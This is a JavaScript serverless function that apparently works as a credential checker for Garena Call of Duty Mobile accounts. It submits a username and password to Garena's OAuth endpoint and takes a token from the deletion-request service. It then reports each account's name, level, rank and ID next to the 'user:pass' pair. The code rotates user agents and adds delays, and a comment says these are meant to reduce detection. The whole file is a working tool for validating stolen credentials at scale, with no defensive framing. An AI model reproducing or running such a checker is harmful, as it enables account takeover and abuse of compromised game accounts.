import fetch from 'node-fetch';
import { HttpsProxyAgent } from 'https-proxy-agent';

// Settings to reduce detection
const DELAY_BETWEEN_REQUESTS = 3000; // 3 seconds delay
const USER_AGENTS = [
    'Mozilla/5.0 (Linux; Android 11; RMX2195) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36'
];

const getRandomUserAgent = () => USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)];
const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));

export default async function handler(req) {
    if (req.method !== 'POST') {
        return new Response(
            JSON.stringify({ status: 'error', details: 'Only POST requests allowed' }),
            { headers: { 'Content-Type': 'application/json' } }
        );
    }

    const { username, password } = await req.json().catch(() => ({})); // Handle invalid JSON input
    if (!username || !password) {
        return new Response(
            JSON.stringify({ status: 'error', details: 'Username/password missing' }),
            { headers: { 'Content-Type': 'application/json' } }
        );
    }

    try {
        await delay(DELAY_BETWEEN_REQUESTS);
        const userAgent = getRandomUserAgent();

        // Step 1: Get access token
        const loginResponse = await fetch('https://auth.garena.com/oauth/token', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
                'User-Agent': userAgent,
                'Accept': 'application/json'
            },
            body: new URLSearchParams({
                username,
                password,
                grant_type: 'password',
                client_id: 'garena-codm'
            }),
            timeout: 20000
        });

        // Check if response is HTML (blocked by Garena)
        const loginContentType = loginResponse.headers.get('Content-Type') || '';
        if (!loginContentType.includes('json')) {
            const htmlText = await loginResponse.text();
            return new Response(
                JSON.stringify({
                    status: 'error',
                    details: `${username}:${password} - Blocked by Garena: ${htmlText.substring(0, 50)}...`
                }),
                { headers: { 'Content-Type': 'application/json' } }
            );
        }

        if (!loginResponse.ok) {
            const errorData = await loginResponse.json().catch(() => ({ message: 'Invalid credentials' }));
            return new Response(
                JSON.stringify({
                    status: 'failed',
                    details: `${username}:${password} - Error ${loginResponse.status}: ${errorData.message || 'Wrong credentials or inactive account'}`
                }),
                { headers: { 'Content-Type': 'application/json' } }
            );
        }

        const loginData = await loginResponse.json().catch(() => ({}));
        const accessToken = loginData.access_token;
        if (!accessToken) {
            return new Response(
                JSON.stringify({
                    status: 'failed',
                    details: `${username}:${password} - Could not get access token`
                }),
                { headers: { 'Content-Type': 'application/json' } }
            );
        }

        await delay(DELAY_BETWEEN_REQUESTS);

        // Step 2: Get CODM token
        const callbackResponse = await fetch(
            `https://auth.codm.garena.com/auth/auth/callback_n?site=${encodeURIComponent('https://api-delete-request.codm.garena.co.id/oauth/check_login/')}&access_token=${accessToken}`,
            {
                method: 'GET',
                headers: {
                    'Referer': 'https://auth.garena.com/',
                    'User-Agent': userAgent
                },
                redirect: 'follow',
                timeout: 20000
            }
        );

        const callbackContentType = callbackResponse.headers.get('Content-Type') || '';
        if (!callbackContentType.includes('html') && !callbackResponse.headers.get('set-cookie')) {
            return new Response(
                JSON.stringify({
                    status: 'error',
                    details: `${username}:${password} - No CODM token found (blocked)`
                }),
                { headers: { 'Content-Type': 'application/json' } }
            );
        }

        const cookieHeader = callbackResponse.headers.get('set-cookie') || '';
        let codmDeleteToken = null;
        if (cookieHeader) {
            const cookieParts = cookieHeader.split(';');
            codmDeleteToken = cookieParts.find(part => part.includes('codm-delete-token'))?.split('=')[1];
        }

        if (!codmDeleteToken) {
            return new Response(
                JSON.stringify({
                    status: 'error',
                    details: `${username}:${password} - Could not get CODM token`
                }),
                { headers: { 'Content-Type': 'application/json' } }
            );
        }

        await delay(DELAY_BETWEEN_REQUESTS);

        // Step 3: Get account details
        const detailsResponse = await fetch('https://api-delete-request.codm.garena.co.id/oauth/check_login/', {
            method: 'GET',
            headers: {
                'codm-delete-token': codmDeleteToken,
                'Origin': 'https://delete-request.codm.garena.co.id',
                'Referer': 'https://delete-request.codm.garena.co.id/',
                'User-Agent': userAgent,
                'Accept': 'application/json'
            },
            timeout: 20000
        });

        const detailsContentType = detailsResponse.headers.get('Content-Type') || '';
        if (!detailsContentType.includes('json')) {
            const htmlText = await detailsResponse.text();
            return new Response(
                JSON.stringify({
                    status: 'error',
                    details: `${username}:${password} - Could not get account details (blocked): ${htmlText.substring(0, 50)}...`
                }),
                { headers: { 'Content-Type': 'application/json' } }
            );
        }

        if (!detailsResponse.ok) {
            return new Response(
                JSON.stringify({
                    status: 'error',
                    details: `${username}:${password} - Error ${detailsResponse.status}: Failed to get account details`
                }),
                { headers: { 'Content-Type': 'application/json' } }
            );
        }

        const accountDetails = await detailsResponse.json().catch(() => ({}));
        const displayName = accountDetails.display_name || accountDetails.username || 'Unknown';
        const level = accountDetails.level || 'Unknown';
        const userId = accountDetails.user_id || 'Unknown';
        const rank = accountDetails.rank?.name || 'Unknown';

        return new Response(
            JSON.stringify({
                status: 'success',
                details: `${username}:${password}\n✅ Display Name: ${displayName}\n📊 Level: ${level}\n🏆 Rank: ${rank}\n🆔 User ID: ${userId}`
            }),
            { headers: { 'Content-Type': 'application/json' } }
        );

    } catch (err) {
        return new Response(
            JSON.stringify({
                status: 'error',
                details: `${username}:${password} - Error: ${err.message}`
            }),
            { headers: { 'Content-Type': 'application/json' } }
        );
    }
}
